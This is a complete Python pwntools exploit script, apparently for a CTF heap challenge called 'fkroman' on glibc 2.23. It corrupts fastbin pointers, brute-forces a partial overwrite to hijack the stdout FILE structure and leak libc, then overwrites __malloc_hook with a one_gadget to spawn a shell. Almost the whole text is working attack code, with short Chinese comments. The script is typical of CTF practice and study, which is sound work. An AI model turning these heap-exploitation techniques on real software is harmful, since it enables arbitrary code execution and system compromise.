from pwn import *
context.log_level = 'debug'

elf = ELF("./fkroman")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

#p = remote("")
def debug():
    gdb.attach(p)
    #p.interactive()

def add(idx, size):
	p.sendlineafter("choice: ", "1")
	p.sendlineafter("Index: ", str(idx))
	p.sendlineafter("Size: ", str(size))
def edit(idx, size, content):
	p.sendlineafter("choice: ", "4")
	p.sendlineafter("Index: ", str(idx))
	p.sendlineafter("Size: ", str(size))
	p.sendafter("Content: ", content)

def free(idx):
	p.sendlineafter("choice: ", '3')
	p.sendlineafter("Index: ", str(idx))
def exp():
	global p
	p = elf.process()
	add(0, 0x60)
	add(1, 0x60)	
	add(2, 0x100)
	add(3, 0x20)
	free(1)	
	free(0)
	free(2)
	edit(0, 1, '\xe0')
	edit(1, 0x70, '\xff'*0x60+p64(0)+p64(0x71))
	edit(2, 2, p16(0x35dd))	 #后三位和高四位一样，爆破倒数第四位
	add(4, 0x60)
	add(5, 0x60)
	add(6, 0x60)
	try:	
		edit(6, 0x54, 'a'*3 +p64(0)*6 + p64(0xfbad1800)+p64(0)*3+'\x00')	#填写flags和write_base
	except:
		log.failure("not lucky enough!")
		p.close()
		return False

	p.recvuntil(p64(0xfbad1800)+p64(0)*3)
	libc_base = u64(p.recv(8)) -0x3c5600	
	log.success("libc_base :" + hex(libc_base))
	malloc_hook = libc.sym['__malloc_hook'] + libc_base 
	one = 0x4526a + libc_base	
		
	add(7, 0x60)
	add(8, 0x60)
	add(9, 0x60)
	free(9)
	free(8)
	edit(8, 8, p64(malloc_hook - 0x23))
	add(10, 0x60)
	add(11, 0x60)
	edit(11, 0x1b, '\x00'*0x13 + p64(one))
	#debug()
	add(0, 0x60)
	p.interactive()
	print 'success'
	p.close()
	return True	

while not exp():
	pass

exp()
